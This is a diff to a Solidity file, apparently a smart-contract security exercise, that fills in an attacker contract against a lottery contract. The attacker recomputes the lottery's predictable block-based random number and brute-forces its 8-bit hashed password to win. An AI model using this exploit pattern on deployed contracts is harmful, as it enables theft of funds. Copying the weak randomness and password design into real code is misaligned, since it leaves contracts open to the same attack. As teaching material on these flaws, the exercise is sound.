@@ -66,6 +66,49 @@ contract LoteriaConPassword {
     }
 }
 
+interface ILoteriaConPassword {
+    function participarEnLoteria(
+        uint8 password,
+        uint256 _numeroGanador
+    ) external payable;
+    
+}
+
 contract AttackerLoteria {
-    function attack(address _sc) public payable {}
+    //ILoteriaConPassword loteria;
+    uint256 public FACTOR =
+        104312904618913870938864605146322161834075447075422067288548444976592725436353;
+
+    /* constructor(address _loteriaConPassword) payable {
+        loteria = ILoteriaConPassword(_loteriaConPassword);
+    } */
+
+    function attack(address _sc) public payable {
+        ILoteriaConPassword loteria = ILoteriaConPassword(_sc);
+        uint256 numRandom = uint256(
+            keccak256(
+                abi.encodePacked(
+                    FACTOR,
+                    uint256(1500),
+                    tx.origin,
+                    block.timestamp,
+                    address(this)
+                )
+            )
+        );
+        uint256 numeroGanador = numRandom % 10;
+        uint8 pass;
+        for (pass; pass <= 255; pass++){
+            if(uint256(keccak256(abi.encodePacked(pass))) == FACTOR){
+                break;
+            }
+        }
+        loteria.participarEnLoteria{value: 1500}(pass, numeroGanador);
+
+        
+    }
+
+    receive() external payable {
+            
+    }
 }
